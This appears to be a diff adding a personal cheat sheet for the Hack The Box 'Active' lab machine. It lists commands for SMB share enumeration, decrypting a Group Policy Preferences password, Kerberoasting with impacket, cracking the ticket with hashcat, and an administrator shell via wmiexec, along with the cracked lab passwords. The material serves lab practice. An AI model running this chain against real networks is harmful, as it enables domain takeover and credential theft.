@@ -1,0 +1,70 @@
+[NMAP]
+nmap -sC -sV 10.10.10.100 -o nmap.tcp
+nmap -sC -sV 10.10.10.100 -oA nmap-report
+nmap -p445 --script smb2-time 10.10.10.100
+nmap --script safe -p 445 10.10.10.100
+nmap --script smb-enum-serivices -p 445 10.10.10.100 -d
+
+[DNSRECON]
+dnsrecon -d active.htb -a -n 10.10.10.100
+dnsrecon -d 10.10.10.100 -r 10.0.0.0/8
+
+[SMBCLIENT]
+smbclient -L 10.10.10.100 --no-pass
+smbclient //10.10.10.100/Replication --no-pass
+smbclient //10.10.10.100/Replication --no-pass -c 'recurse;ls'
+
+[SMBMAP]
+smbmap -H 10.10.10.100
+smbmap -R Replication -H 10.10.10.100
+smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q
+smbmap -d active.htb -u svc_tgs -p password@123 -H 10.10.10.100
+smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users
+
+[ENUM4LINUX] - NO RECOMMENDED - 2OLD
+enum4linux 10.10.10.100
+
+[CRACKMAP]
+crackmapexec smb 10.10.10.100 -u '' -p '' --shares
+crackmapexec smb 10.10.10.100 -d ACTIVE -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
+
+[HASHCAT]
+hashcat -m 13100 hash.administrator /usr/share/wordlists/rockyou.txt --force
+
+[GPP-DECRYPT]
+Gpp-decrypt <HASH>  :: Herramienta para decifrar hash windows/active directory
+
+[IMPACKET]
+
+GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs
+GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18
+python ~/HACKTHEBOX/CRACKING-TOOLS/impacket-0.9.18/build/scripts-2.7/GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18
+impacket-wmiexec active/administrator:Ticketmaster1968@10.10.10.100
+
+
+
+FROM WINDOWS ATTCK MACHINE
+
+Runas /netonly /user:active.htb\svc_tgs cmd
+Dir \\10.10.10.100\Users
+
+COMMANDS
+/etc/hosts >> 10.10.10.100    active.htb    active
+Locate -r ‘\.nses$’ |xargs grep categories | grep ‘default\|version’ |grep smb
+Apt-get install crackmapexec
+locate GetUserSPNs.py
+Runas /netonly /user:ACTIVE\SVC_TGS cmd.exe
+Net time \\10.10.10.100 /set /yes
+hwclock --show
+Hwclock --set --date “2018-12-16 20:57:35.765334-0500” --localtime
+Iptables --table nat --append POSTROUTING --out-interface tun0 -j MASQUERADE
+Echo 1 > /proc/sys/net/ipv4/ip_forward
+Route add 10.10.10.100 mask 255.255.255.0 <IP-KALI>
+xdg-open .   :: xdg-open - opens a file or URL in the user's preferred application
+
+
+
+SOURCE
+https://www.youtube.com/watch?v=rx-VzbAaWr8&t=1077s
+https://www.youtube.com/watch?v=jUc1J31DNdw&t=423s
+
